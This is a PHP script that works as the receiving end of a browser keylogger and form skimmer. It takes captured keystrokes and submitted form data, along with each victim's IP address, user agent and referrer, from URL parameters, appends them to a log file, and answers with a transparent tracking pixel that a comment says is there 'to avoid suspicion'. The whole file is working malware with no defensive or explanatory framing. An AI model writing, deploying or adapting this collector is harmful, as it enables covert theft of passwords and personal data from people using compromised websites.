<?php
// Log the keystrokes with enhanced information
$key = $_GET['key'] ?? 'No key received';
$page = $_GET['page'] ?? 'Unknown page';
$element = $_GET['element'] ?? 'Unknown element';
$id = $_GET['id'] ?? 'No ID';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$referrer = $_SERVER['HTTP_REFERER'] ?? 'Unknown';

// Check if this is form data
if (isset($_GET['formData'])) {
    $formData = $_GET['formData'];
    $log_entry = "=== FORM SUBMISSION CAPTURED ===\n";
    $log_entry .= "Time: $timestamp\n";
    $log_entry .= "IP: $ip\n";
    $log_entry .= "Page: $page\n";
    $log_entry .= "Form Data: $formData\n";
    $log_entry .= "User-Agent: $user_agent\n";
    $log_entry .= "Referrer: $referrer\n";
    $log_entry .= "==============================\n\n";
} else {
    // Standard keystroke logging
    $log_entry = "$timestamp | $ip | Key: $key | Page: $page | Element: $element | ID: $id | $user_agent\n";
}

// Log to file
file_put_contents('keystrokes.log', $log_entry, FILE_APPEND);

// Return a transparent 1x1 pixel GIF to avoid suspicion
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>